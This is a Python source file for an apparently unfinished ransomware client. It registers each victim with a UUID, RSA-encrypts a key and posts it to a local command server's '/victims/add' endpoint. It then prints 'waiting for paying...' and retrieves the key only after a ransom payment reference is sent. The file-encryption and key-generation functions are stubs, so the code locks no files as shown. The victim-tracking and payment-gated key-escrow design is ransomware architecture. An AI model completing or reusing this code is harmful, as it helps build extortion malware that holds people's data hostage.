import os
import uuid
import json
import requests
from Crypto.PublicKey import RSA
from base64 import b64decode, b64encode
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Hash import SHA

CUR_PATH = os.path.dirname(__file__)

with open(f'{CUR_PATH}/pubkey', 'r') as f:
    PUB_KEY = RSA.importKey(f.read())
ADD_URL = 'http://localhost:5000/victims/add'
GET_URL = 'http://localhost:5000/victims/'
HEADER = {
        "content-type": "application/json"
    }

class Client():
    def __init__(self):
        self.id = uuid.uuid1().hex
        self.aes_key = self.gen_key()
        # print(self.id)
        # print(self.aes_key)
        self.init_virus()

    def init_virus(self):
        print('initializing...')
        self.enc_file()
        self.enc_key()
        data = {
            'id': self.id,
            'aes_key': self.aes_key
        }
        self.post_server(data, ADD_URL)
        print('waiting for paying...')
    
    def gen_key(self):
        print('generating key...')
        return 'aes_key'

    def enc_key(self, pubkey=PUB_KEY, sign=False):
        print('encryptint key...')
        mes = b64encode(self.aes_key.encode())
        mlen = len(mes)
        cipher = PKCS1_v1_5.new(PUB_KEY)
        h = SHA.new(mes)
        result = cipher.encrypt(mes + h.digest()) if sign else cipher.encrypt(mes)
        # return b64decode(result).decode()
        self.aes_key = b64encode(result).decode()

    def dec_key(self):
        print('decrypting key...')
        pass

    def enc_file(self):
        print('encrypting file...')
        pass

    def dec_file(self):
        print('decrypting file...')
        pass

    def get_key(self, out_trade_no=None):
        data = {
            'id': self.id,
            'aes_key': self.aes_key,
            'ransom': True,
            'out_trade_no': out_trade_no
        }
        res = self.post_server(data, GET_URL + self.id)
        if res['status'] == 'success':
            self.aes_key = res['aes_key']
            print('get aes_key success')
            return True
        else:
            return False

    @staticmethod
    def post_server(data, url):
        payload = json.dumps(data)
        r = requests.post(url, payload, headers=HEADER)
        return r.json()

if __name__ == "__main__":
    client = Client()
    # client.aes_key = '123'
    # # print(client.aes_key)
    # client.enc_key()
    # data = {
    #         'id': uuid.uuid1().hex
    #     }
    # r = Client.post_server(data)
    # print(r)
    # print(r.json())
    # post_data = {"id": "mkf", "aes_key": "456", "ransom": True}
    # client.post_server(post_data)
    # client.put(post_data)